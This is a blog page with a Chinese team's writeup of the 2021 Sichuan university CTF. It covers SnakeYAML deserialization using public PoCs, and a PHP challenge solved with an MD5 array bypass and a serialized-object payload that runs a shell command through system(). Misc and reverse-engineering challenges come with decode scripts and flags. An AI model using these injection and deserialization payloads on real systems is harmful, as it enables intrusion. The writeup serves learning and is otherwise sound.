@@ -1,0 +1,320 @@
+<!DOCTYPE html><html lang="zh-CH" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>2021 四川省大学生大赛 wp | The_Itach1</title><meta name="author" content="The_Itach1"><meta name="copyright" content="The_Itach1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="2021年四川省大学生网络安全技能大赛  writeup师傅们tql，排名第八，得了个证书，哈哈哈 一、 战队信息战队名称：boy_next_the_door 战队编号：lx_31426d 所属单位：成都信息工程大学 战队成员姓名：吴昊 刘仕林 张舒 二、解题情况  三、 解题过程题目一 easyyaml操作内容：去网上搜索了一下别人的poc https:&#x2F;&#x2F;github.com&#x2F;artsploi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2021 四川省大学生大赛 wp">
+<meta property="og:url" content="http://example.com/2022/06/11/20l21%E5%B9%B4%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%20%20writeup/index.html">
+<meta property="og:site_name" content="The_Itach1">
+<meta property="og:description" content="2021年四川省大学生网络安全技能大赛  writeup师傅们tql，排名第八，得了个证书，哈哈哈 一、 战队信息战队名称：boy_next_the_door 战队编号：lx_31426d 所属单位：成都信息工程大学 战队成员姓名：吴昊 刘仕林 张舒 二、解题情况  三、 解题过程题目一 easyyaml操作内容：去网上搜索了一下别人的poc https:&#x2F;&#x2F;github.com&#x2F;artsploi">
+<meta property="og:locale" content="zh_CH">
+<meta property="og:image" content="https://i.loli.net/2021/05/15/Eran1WOK8LZmQXw.jpg">
+<meta property="article:published_time" content="2022-06-10T17:10:13.859Z">
+<meta property="article:modified_time" content="2021-05-18T15:11:38.473Z">
+<meta property="article:author" content="The_Itach1">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/05/15/Eran1WOK8LZmQXw.jpg"><link rel="shortcut icon" href="/img/2.png"><link rel="canonical" href="http://example.com/2022/06/11/20l21%E5%B9%B4%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%20%20writeup/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-05-18 23:11:38'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/5.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">53</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> music</span></a></li><li><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> Gallery</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> movies</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://i.loli.net/2021/05/15/Eran1WOK8LZmQXw.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">The_Itach1</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> music</span></a></li><li><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> Gallery</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> movies</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">2021 四川省大学生大赛 wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-06-10T17:10:13.859Z" title="Created 2022-06-11 01:10:13">2022-06-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-05-18T15:11:38.473Z" title="Updated 2021-05-18 23:11:38">2021-05-18</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="2021年四川省大学生网络安全技能大赛-writeup"><a href="#2021年四川省大学生网络安全技能大赛-writeup" class="headerlink" title="2021年四川省大学生网络安全技能大赛  writeup"></a>2021年四川省大学生网络安全技能大赛  writeup</h1><p>师傅们tql，排名第八，得了个证书，哈哈哈</p>
+<h2 id="一、-战队信息"><a href="#一、-战队信息" class="headerlink" title="一、 战队信息"></a><strong>一、</strong> 战队信息</h2><p>战队名称：boy_next_the_door</p>
+<p>战队编号：lx_31426d</p>
+<p>所属单位：成都信息工程大学</p>
+<p>战队成员姓名：吴昊 刘仕林 张舒</p>
+<h2 id="二、解题情况"><a href="#二、解题情况" class="headerlink" title="二、解题情况"></a><strong>二、</strong>解题情况</h2><p><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600366713722322944&puid=155796514" alt="image-20210515164157410"></p>
+<p><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600366721616007168&puid=155796514" alt="image-20210515164251587"></p>
+<h2 id="三、-解题过程"><a href="#三、-解题过程" class="headerlink" title="三、 解题过程"></a><strong>三、</strong> 解题过程</h2><h3 id="题目一-easyyaml"><a href="#题目一-easyyaml" class="headerlink" title="题目一 easyyaml"></a>题目一 easyyaml</h3><h2 id="操作内容："><a href="#操作内容：" class="headerlink" title="操作内容："></a>操作内容：</h2><p>去网上搜索了一下别人的poc</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true">https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true</a></p>
+<p>将其更改了一下</p>
+<p>这个题考察snakeyaml的反序列化</p>
+<p>但是有一点需要注意的是</p>
+<p>address类的属性ext为Object.gadget从第二个链接获取</p>
+<p>将要执行的Java代码放入<a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java">AwesomeScriptEngineFactory.java中</a>并进行编译：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac src &#x2F; artsploit &#x2F; AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src &#x2F; 。</span><br></pre></td></tr></table></figure>
+
+<p>然后即可进行正常的攻击</p>
+<h3 id="flag值"><a href="#flag值" class="headerlink" title="flag值"></a>flag值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;31df1d6dca4683ad8c27acf8c7c04326&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="题目二-papapa"><a href="#题目二-papapa" class="headerlink" title="题目二 papapa"></a>题目二 papapa</h3><h3 id="操作内容：-1"><a href="#操作内容：-1" class="headerlink" title="操作内容："></a>操作内容：</h3><p>扫描目录发现robots.txt</p>
+<p>看robots.txt有提示main.php<br><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600361495638425600&puid=155796514" alt="image-20210515135112692"><br><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600361511748743168&puid=155796514" alt="image-20210515140017409"></p>
+<p>传参a发现了加密的代码</p>
+<p><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600361531547430912&puid=155796514" alt="image-20210515140140792"></p>
+<p>两次base64解码 再 16进制解码得到源码</p>
+<p><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600361546175598593&puid=155796514" alt="image-20210515140619900"></p>
+<p>md5数组绕过，正则那可以-绕过，也可以用%0a绕过</p>
+<p>然后知道了system()能命令执行</p>
+<p>构造payload</p>
+<p>使用ls 看到wobushif0agaaa.txt</p>
+<p>cat这个文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; &#39;this_is_a_easy_php&#39;</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class NoVu &#123;</span><br><span class="line">    public $command&#x3D;&#39;cat wobushif0agaaa.txt&#39;;</span><br><span class="line">&#125;</span><br><span class="line">echo urlencode(serialize(new NoVu));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>最后的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;main.php?a[]&#x3D;1&amp;b[]&#x3D;2&amp;c&#x3D;-&amp;d&#x3D;O%3A4%3A&quot;NoVu&quot;%3A1%3A%7Bs%3A7%3A&quot;command&quot;%3Bs%3A22%3A&quot;cat+wobushif0agaaa.txt&quot;%3B%7D</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600361592707833856&puid=155796514" alt="image-20210515162112926"></p>
+<h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; &#39;this_is_a_easy_php&#39;</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class NoVu &#123;</span><br><span class="line">    public $command&#x3D;&#39;cat wobushif0agaaa.txt&#39;;</span><br><span class="line">&#125;</span><br><span class="line">echo urlencode(serialize(new NoVu));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="flag值-1"><a href="#flag值-1" class="headerlink" title="flag值"></a>flag值</h3><p>flag{73ac78436f0e761123a9888bf24a5c79}</p>
+<h3 id="题目三-Misc-我的世界"><a href="#题目三-Misc-我的世界" class="headerlink" title="题目三 Misc 我的世界"></a>题目三 Misc 我的世界</h3><h3 id="操作内容：-2"><a href="#操作内容：-2" class="headerlink" title="操作内容："></a>操作内容：</h3><p>​    下载文件后打开我的世界，发现真的是个游戏：</p>
+<p><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600395295299424256&puid=155796514" alt="img"><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600395306265473024&puid=155796514" alt="img"><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600395315130097664&puid=155796514" alt="img"><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600395352128057344&puid=155796514" alt="img"> </p>
+<p>​    在信标处宝箱内可以得到一本名字为flag1的书，打开后发现以上字符串，初步断定是*<strong>*栅栏加密**</strong>，先解一下，这里我用的<a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">在线工具</a>，当栏数为14时得到</p>
+<p><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600395134382895104&puid=155796514" alt="img"> </p>
+<p>很像flag了，尝试提交但是不对，继续在地图内探索，在信标旁内的洞穴内发现有如下：</p>
+<p><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600395146786881536&puid=155796514" alt="img"><img src="file:///C:\Users\86188\AppData\Local\Temp\ksohtml26536\wps7.jpg" alt="img"> </p>
+<p>可以看到在信标附近有异常，飞过去看，是这个：<br><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600395384594989056&puid=155796514" alt="img"></p>
+<p>结合flag=1+1，经过尝试得到flag，居然是把CTF515加在后面，不得不说这个题确实有点脑洞的感觉。</p>
+<h3 id="如该题使用自己编写的脚本请详细写出，不允许截图"><a href="#如该题使用自己编写的脚本请详细写出，不允许截图" class="headerlink" title="如该题使用自己编写的脚本请详细写出，不允许截图"></a>如该题使用自己编写的脚本请详细写出，不允许截图</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>
+
+<p>flag值上传图片失败。错误信息： <code>Comman</code>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;scdxsCTF2021422CTF515&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="题目四-Misc-disk-recover"><a href="#题目四-Misc-disk-recover" class="headerlink" title="题目四 Misc disk-recover"></a>题目四 Misc disk-recover</h3><h3 id="操作内容：-3"><a href="#操作内容：-3" class="headerlink" title="操作内容："></a>操作内容：</h3><p>​    下载解压题目得到upload.pcapng文件，直接用7-Zip可以解压出一个已损坏的光盘映像文件disk-recovery.img，直接用DiskGenius恢复。</p>
+<p>​    先打开损坏文件：</p>
+<p>​    <img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600380549140959232&puid=155796514" alt="img"></p>
+<p>​    再选中恢复</p>
+<p><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600396968641540096&puid=155796514" alt="img"> </p>
+<p>​    得到了一个.xls文件,</p>
+<p><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600395191882612736&puid=155796514" alt="img"> </p>
+<p><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600395201071132672&puid=155796514" alt="img"> </p>
+<p>打开就可以看到flag</p>
+<h3 id="flag"><a href="#flag" class="headerlink" title="flag:"></a>flag:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;E7A10C15E26AA5750070EF756AAA1F7C&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="题目五-Misc-pack"><a href="#题目五-Misc-pack" class="headerlink" title="题目五 Misc pack"></a>题目五 Misc pack</h3><h3 id="操作内容"><a href="#操作内容" class="headerlink" title="操作内容:"></a>操作内容:</h3><p>ctf.exe，pe view打开，可以看到节区名错了</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600394843689156608&puid=155796514" alt="img"></h2><p>upx脱壳，脱壳先修改节区名</p>
+<p>脱壳完后，用ResourceHacker.exe打开，看资源，得到flag分为2部分</p>
+<p><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600394832876240896&puid=155796514" alt="img"> </p>
+<h3 id="脚本："><a href="#脚本：" class="headerlink" title="脚本："></a>脚本：</h3><p>无</p>
+<h3 id="flag："><a href="#flag：" class="headerlink" title="flag："></a>flag：</h3><h3 id="flag-0bed66d154ccbdd07a6342abf97a5cfc"><a href="#flag-0bed66d154ccbdd07a6342abf97a5cfc" class="headerlink" title="flag{0bed66d154ccbdd07a6342abf97a5cfc}"></a>flag{0bed66d154ccbdd07a6342abf97a5cfc}</h3><h3 id="题目六-em0ji"><a href="#题目六-em0ji" class="headerlink" title="题目六 em0ji"></a>题目六 em0ji</h3><h3 id="操作内容：-4"><a href="#操作内容：-4" class="headerlink" title="操作内容："></a>操作内容：</h3><p>下载附件打开<br><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600361457650434048&puid=155796514" alt="image-20210515141433133"></p>
+<p>前面四个肯定是flag</p>
+<p>所以借此线索进行收集</p>
+<p>网上搜索emoji的官方网站</p>
+<p><a target="_blank" rel="noopener" href="https://www.emojiall.com/zh-hans/emoji/%F0%9F%98%81">https://www.emojiall.com/zh-hans/emoji/%F0%9F%98%81</a></p>
+<p><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600424269911539712&puid=155796514" alt="image-20210515203137931"></p>
+<p>查看简短代码的首字母，拼接得到</p>
+<p><img src="http://pan-yz.chaoxing.com/download/downloadfile?fleid=600394811267547136&puid=155796514" alt="image-20210515141708869"></p>
+<h3 id="脚本：-1"><a href="#脚本：-1" class="headerlink" title="脚本："></a>脚本：</h3><p>无</p>
+<h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;emojiisverysimple&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="题目七-easy-re"><a href="#题目七-easy-re" class="headerlink" title="题目七 easy_re"></a>题目七 easy_re</h3><h3 id="操作内容：-5"><a href="#操作内容：-5" class="headerlink" title="操作内容："></a>操作内容：</h3><p>upx解壳，手动或者upx脱。</p>
+<p>分析流程<br><img src="https://i.loli.net/2021/05/15/YJmCVrnf2sAxohM.png"><br>脚本</p>
+<h4 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h4><pre><code>#include&lt;stdio.h&gt;
+
+int main()
+&#123;
+    char code[]=&quot;&#39;- &amp;:8.4a 3$a&amp;3$ 5```&lt;&quot;;
+    int i;
+
+    for(i=0;i&lt;22;i++)
+    &#123;
+        printf(&quot;%c&quot;,code[i]^0x41);
+    &#125;
+&#125;</code></pre>
+<h3 id="flag值-2"><a href="#flag值-2" class="headerlink" title="flag值"></a>flag值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;you are great!!!&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="题目八-easy-pyc"><a href="#题目八-easy-pyc" class="headerlink" title="题目八 easy.pyc"></a>题目八 easy.pyc</h3><h3 id="操作内容：-6"><a href="#操作内容：-6" class="headerlink" title="操作内容："></a>操作内容：</h3><p>pyc转py</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6 -o  C:\Users\hp\Downloads\easy.py C:\Users\hp\Downloads\easy.pyc</span><br></pre></td></tr></table></figure>
+
+<p>然后看流程<br><img src="https://i.loli.net/2021/05/15/CAkJHtq2aBGT1DS.png"><br>脚本</p>
+<h4 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h4><pre><code>import base64
+url = &quot;XlhlX0sMEWNiDxQQDgwTXl5eZRFgFWMOFBATXhMMYw8PD2UMZUk=&quot;
+str_url = base64.b64decode(url)
+for i in str_url:
+    x=(i-6)^62
+    print(chr(x),end=&#39;&#39;)</code></pre>
+<h3 id="flag值-3"><a href="#flag值-3" class="headerlink" title="flag值"></a>flag值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;85cb704683fffa5d1c6043f38c777a8a&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="题目九-base变形计-exe"><a href="#题目九-base变形计-exe" class="headerlink" title="题目九 base变形计.exe"></a>题目九 base变形计.exe</h3><h3 id="操作内容：-7"><a href="#操作内容：-7" class="headerlink" title="操作内容："></a>操作内容：</h3><p>upx脱壳<br><img src="https://i.loli.net/2021/05/15/hyj7lxopfWSiRJL.png"></p>
+<p>先得到str2</p>
+<pre><code>#include&lt;stdio.h&gt;
+
+int main(void)
+&#123;
+    int v9[]=&#123;0x00000050,0x00000067,0x00000072,0x00000062,0x00000050,0x00000019,0x00000079,0x0000001e,0x00000047,0x0000005e,0x0000004f,0x00000072,0x00000044,0x0000005d,0x0000005f,0x0000001b,0x00000044,0x00000070,0x00000062,0x00000063,0x00000047,0x0000005d,0x00000047,0x00000072,0x00000045,0x0000005e,0x00000050,0x00000063,0x00000047,0x00000070,0x0000005b,0x00000018,0x00000050,0x00000060,0x00000069,0x0000001f,0x00000053,0x0000005d,0x0000004c,0x00000066,0x00000045,0x0000005e,0x00000053,0x00000072,0x00000053,0x00000070,0x0000005b,0x0000007d,0x00000053,0x00000019,0x0000001a,0x00000017&#125;;
+    char str2[]=&quot;0000000000000000000000000000000000000000000000000000&quot;;
+    int i;
+
+    for(i=0;i&lt;=51;i++)
+    &#123;
+        str2[i]=42^v9[i];
+
+        printf(&quot;%c&quot;,str2[i]);
+    &#125;
+&#125;
+//zMXHz3S4mteXnwu1nZHImwmXotzImZq2zJC5ywfLotyXyZqWy30=</code></pre>
+<p>变表base解密</p>
+<pre><code>import base64
+import string
+
+str1 = &#39;zMXHz3S4mteXnwu1nZHImwmXotzImZq2zJC5ywfLotyXyZqWy30=&#39;
+
+string1 = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/&#39;
+string2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;
+
+print(base64.b64decode(str1.translate(str.maketrans(string1, string2))))</code></pre>
+<h3 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;81115e578b1c196b346f79aae961c40c&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="题目十-2021年四川省大学生网络安全技能大赛问卷调查"><a href="#题目十-2021年四川省大学生网络安全技能大赛问卷调查" class="headerlink" title="题目十 2021年四川省大学生网络安全技能大赛问卷调查"></a>题目十 2021年四川省大学生网络安全技能大赛问卷调查</h3><h3 id="操作内容：-8"><a href="#操作内容：-8" class="headerlink" title="操作内容："></a>操作内容：</h3><p>有手就行</p>
+<h3 id="脚本-3"><a href="#脚本-3" class="headerlink" title="脚本:"></a>脚本:</h3><p>无</p>
+<h3 id="flag-3"><a href="#flag-3" class="headerlink" title="flag:"></a>flag:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ZWNkeHNjdGZpc2cwMGQ&#125;</span><br></pre></td></tr></table></figure>
+
+
+
